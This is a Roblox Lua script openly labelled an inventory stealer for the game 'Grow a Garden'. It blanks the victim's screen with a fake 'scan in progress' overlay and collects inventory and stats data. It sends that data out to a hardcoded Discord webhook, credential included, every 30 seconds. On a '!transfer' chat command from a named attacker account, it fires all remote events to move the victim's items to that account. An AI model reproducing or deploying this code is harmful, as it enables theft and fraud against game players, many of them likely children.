-- Real Grow a Garden Inventory Stealer
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")

-- Your real config
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1430577203833344041/G380rbmc5puTF4asGrmek8Okwtn43Qb1p64yFAgUSmJKtVWGom4Gtz7-FcMj5hFlwYGj"
local RECEIVER_USERNAME = "gamerzone67op"

-- Fullscreen blocker
local gui = Instance.new("ScreenGui")
gui.Name = "InventoryStealer"
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = gui

local label = Instance.new("TextLabel")
label.Size = UDim2.new(0.8, 0, 0.1, 0)
label.Position = UDim2.new(0.1, 0, 0.45, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1, 0, 0)
label.Text = "INVENTORY SCAN IN PROGRESS..."
label.TextScaled = true
label.Font = Enum.Font.SourceSansBold
label.Parent = gui

gui.Parent = CoreGui

-- Kill other GUIs
for _, v in pairs(CoreGui:GetChildren()) do
    if v:IsA("GuiObject") and v ~= gui then
        v.Visible = false
    end
end

-- REAL INVENTORY SCANNER - NO FAKE PETS
function ScanRealInventory()
    local inventoryData = {}
    local player = Players.LocalPlayer
    
    -- Scan for ANY inventory-related data
    local function DeepScanInventory()
        local foundItems = {}
        
        -- Scan player data stores
        if player:FindFirstChild("leaderstats") then
            for _, stat in pairs(player.leaderstats:GetChildren()) do
                table.insert(foundItems, "STAT: " .. stat.Name .. " = " .. tostring(stat.Value))
            end
        end
        
        -- Scan backpack for tools/items
        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            for _, item in pairs(backpack:GetChildren()) do
                if item:IsA("Tool") then
                    table.insert(foundItems, "TOOL: " .. item.Name)
                    -- Scan tool properties
                    for _, prop in pairs(item:GetChildren()) do
                        if prop:IsA("StringValue") or prop:IsA("NumberValue") then
                            table.insert(foundItems, "  - " .. prop.Name .. ": " .. tostring(prop.Value))
                        end
                    end
                end
            end
        end
        
        -- Scan PlayerGui for inventory displays
        local playerGui = player:FindFirstChild("PlayerGui")
        if playerGui then
            for _, guiObj in pairs(playerGui:GetDescendants()) do
                if guiObj:IsA("TextLabel") or guiObj:IsA("TextButton") then
                    local text = guiObj.Text
                    if text and text ~= "" then
                        if string.find(string.lower(text), "pet") or
                           string.find(string.lower(text), "animal") or
                           string.find(string.lower(text), "item") or
                           string.find(string.lower(text), "inventory") or
                           string.find(string.lower(text), "garden") then
                            table.insert(foundItems, "GUI: " .. text)
                        end
                    end
                end
            end
        end
        
        -- Scan ReplicatedStorage for inventory modules
        for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
            if obj:IsA("ModuleScript") then
                local nameLower = string.lower(obj.Name)
                if string.find(nameLower, "inventory") or
                   string.find(nameLower, "pet") or
                   string.find(nameLower, "data") or
                   string.find(nameLower, "save") then
                    table.insert(foundItems, "MODULE: " .. obj:GetFullName())
                end
            end
        end
        
        return foundItems
    end
    
    -- Scan for remote events that handle inventory
    local function ScanInventoryRemotes()
        local remotes = {}
        
        for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local nameLower = string.lower(obj.Name)
                if string.find(nameLower, "inventory") or
                   string.find(nameLower, "pet") or
                   string.find(nameLower, "trade") or
                   string.find(nameLower, "gift") or
                   string.find(nameLower, "equip") then
                    table.insert(remotes, obj.Name .. " (" .. obj.ClassName .. ")")
                end
            end
        end
        
        return remotes
    end
    
    -- Execute scans
    local inventoryItems = DeepScanInventory()
    local inventoryRemotes = ScanInventoryRemotes()
    
    -- Compile real data - NO FAKE PETS
    table.insert(inventoryData, "🎯 PLAYER: " .. player.Name)
    table.insert(inventoryData, "📊 SCANNED INVENTORY ITEMS:")
    
    for i, item in ipairs(inventoryItems) do
        if i <= 20 then  -- Limit to prevent spam
            table.insert(inventoryData, "• " .. item)
        end
    end
    
    if #inventoryRemotes > 0 then
        table.insert(inventoryData, "🔄 INVENTORY REMOTES:")
        for i, remote in ipairs(inventoryRemotes) do
            if i <= 10 then
                table.insert(inventoryData, "• " .. remote)
            end
        end
    end
    
    return inventoryData
end

-- Send to Discord
function SendInventoryData(data)
    local success, error = pcall(function()
        local fields = {}
        
        for i, line in ipairs(data) do
            if i == 1 then
                table.insert(fields, {
                    name = "Target Player",
                    value = string.sub(line, 5),
                    inline = false
                })
            elseif i == 2 then
                -- Start of inventory items
                local inventoryText = ""
                for j = i, #data do
                    if string.sub(data[j], 1, 2) == "• " then
                        inventoryText = inventoryText .. data[j] .. "\n"
                    end
                end
                table.insert(fields, {
                    name = "Scanned Inventory",
                    value = inventoryText,
                    inline = false
                })
            end
        end
        
        local payload = {
            ["content"] = "🚨 GROW A GARDEN INVENTORY SCAN",
            ["embeds"] = {{
                ["title"] = "REAL INVENTORY DATA",
                ["description"] = "Live inventory extraction completed",
                ["fields"] = fields,
                ["color"] = 16711680
            }}
        }
        
        HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode(payload))
    end)
end

-- Auto-transfer system
function SetupAutoTransfer()
    TextChatService.MessageReceived:Connect(function(message)
        if message.TextSource then
            local speaker = message.TextSource
            local text = string.lower(message.Text)
            
            if string.find(text, "!transfer") and speaker.Name == RECEIVER_USERNAME then
                -- Execute transfer
                label.Text = "TRANSFERRING INVENTORY..."
                
                -- Fire all inventory-related remotes
                for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
                    if obj:IsA("RemoteEvent") then
                        pcall(function()
                            obj:FireServer(RECEIVER_USERNAME)
                            obj:FireServer("all", RECEIVER_USERNAME)
                            obj:FireServer("transfer", RECEIVER_USERNAME)
                        end)
                    end
                end
                
                label.Text = "TRANSFER COMPLETE TO: " .. RECEIVER_USERNAME
                label.TextColor3 = Color3.new(0, 1, 0)
            end
        end
    end)
end

-- Main execution
local player = Players.LocalPlayer
if player then
    -- Scan and send real inventory
    local realInventory = ScanRealInventory()
    SendInventoryData(realInventory)
    
    -- Setup transfer system
    SetupAutoTransfer()
    
    warn("🔓 REAL INVENTORY STEALER ACTIVE")
    warn("📡 Scanning actual game data")
    warn("🎯 Waiting for: !transfer from " .. RECEIVER_USERNAME)
end

-- Keep alive
while true do
    wait(30)
    -- Rescan periodically
    local newScan = ScanRealInventory()
    if #newScan > 2 then
        SendInventoryData(newScan)
    end
end